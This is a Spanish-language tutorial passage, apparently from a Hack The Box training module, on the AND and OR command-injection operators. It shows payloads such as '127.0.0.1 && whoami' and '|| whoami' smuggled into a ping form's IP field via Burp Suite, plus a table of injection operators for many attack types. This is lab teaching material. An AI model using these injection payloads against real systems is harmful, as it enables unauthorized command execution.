# Otros operadores de inyección de comandos

Antes de continuar, probemos algunos otros operadores de inyección y veamos de qué manera diferente los manejaría la aplicación web.

## Operador AND

Podemos empezar con el operador `AND` (`&&`), de modo que nuestra carga útil final sería `127.0.0.1 && whoami`, y el comando final ejecutado sería el siguiente:

```bash
ping -c 1 127.0.0.1 && whoami
```

Como siempre, intentemos ejecutar el comando en nuestra máquina virtual Linux primero para asegurarnos de que sea un comando que funcione:

```shell-session
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 && whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

Como podemos ver, el comando se ejecuta y obtenemos el mismo resultado que obtuvimos anteriormente. Intente consultar la tabla de operadores de inyección de la sección anterior y vea cómo funciona `&&`. ¿Si no escribimos una IP y comenzamos directamente con `&&`, el comando seguiría funcionando?

Ahora, podemos hacer lo mismo que hicimos antes copiando nuestra carga útil y pegándola en nuestra solicitud HTTP en Burp Suite, codificándolo en URL y finalmente enviándolo:\
![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP '127.0.0.1+%26%26+whoami'. La respuesta muestra HTML con un resultado de ping para 127.0.0.1.](<../../.gitbook/assets/cmdinj_basic_AND (1).jpg>)

Como podemos ver, inyectamos exitosamente nuestro comando y recibimos el resultado esperado de ambos comandos.

## Operador OR

Probemos el operador `OR` (`||`). El operador `OR` solo ejecuta el segundo comando si el primer comando no se ejecuta. Esto es útil cuando nuestra inyección rompería el comando original sin tener una forma segura de que ambos comandos funcionen. Usando `OR`, el nuevo comando solo se ejecutará si el primero falla.

Si intentamos utilizar nuestra carga útil habitual con `||` (`127.0.0.1 || whoami`), veremos que solo se ejecutaría el primer comando:

```shell-session
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

Esto se debe a cómo funcionan los comandos en `bash`. Como el primer comando devuelve el código de salida `0` (ejecución exitosa), `bash` no ejecuta el segundo comando. Solo intentaría ejecutar el otro comando si el primer comando fallara y devolviera un código de salida distinto de `0`.

Intentemos romper intencionalmente el primer comando al no proporcionar una IP y usar directamente el operador `||` (`|| whoami`), de modo que el comando `ping` falle y nuestro comando inyectado se ejecute:

```shell-session
21y4d@htb[/htb]$ ping -c 1 || whoami

ping: usage error: Destination address required
21y4d
```

Como podemos ver, esta vez `whoami` se ejecutó después de que `ping` fallara y mostrara un mensaje de error. Probemos ahora la carga útil `|| whoami` en nuestra solicitud HTTP:\
![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP configurada en '|+whoami'. La respuesta muestra HTML con un formulario para ingresar una dirección IP y un botón 'Verificar'.](<../../.gitbook/assets/cmdinj_basic_OR (1).jpg>)

Vemos que esta vez solo obtuvimos la salida del segundo comando, como se esperaba. Con esto, utilizamos una carga útil mucho más simple y obtenemos un resultado mucho más limpio.

## Otros operadores y resumen

Estos operadores se pueden utilizar para varios tipos de inyecciones (SQL, LDAP, XSS, SSRF, XXE, etc.). A continuación hay una lista de operadores comunes que se pueden utilizar para distintas inyecciones:

| Tipo de inyección                                      | Operadores                                                       |
| ------------------------------------------------------ | ---------------------------------------------------------------- |
| Inyección SQL                                          | `'` , `,` , `;` , `--` , `/* */`                                 |
| Inyección de comandos                                  | `;` , `&&`                                                       |
| Inyección de LDAP                                      | `*` , `(` , `)` , `&` , `\|`                                     |
| Inyección XPath                                        | `'` , `or` , `and` , `not` , `substring` , `concat` , `count`    |
| Inyección de comandos del sistema operativo            | `;` , `&` , `\|`                                                 |
| Inyección de código                                    | `'` , `;` , `--` , `/* */` , `$()` , `${}` , `#{}` , `%{}` , `^` |
| Recorrido por directorio/recorrido por ruta de archivo | `../` , `..\\` , `%00`                                           |
| Inyección de objetos                                   | `;` , `&` , `\|`                                                 |
| Inyección de XQuery                                    | `'` , `;` , `--` , `/* */`                                       |
| Inyección de código Shell                              | `\x` , `\u` , `%u` , `%n`                                        |
| Inyección de encabezado                                | `\n` , `\r\n` , `\t` , `%0d` , `%0a` , `%09`                     |

Tenga en cuenta que esta tabla no es exhaustiva; existen muchas otras opciones y operadores posibles y depende en gran medida del entorno con el que se esté trabajando y probando.

En este módulo tratamos principalmente inyecciones de comando directas, en las que nuestra entrada va directamente al comando del sistema y recibimos la salida del comando. Para más sobre inyecciones de comando avanzadas (inyecciones indirectas o ciegas), puede consultar el módulo "Whitebox Pentesting 101: Command Injection" que cubre métodos avanzados de inyección y muchos otros temas:\
https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection
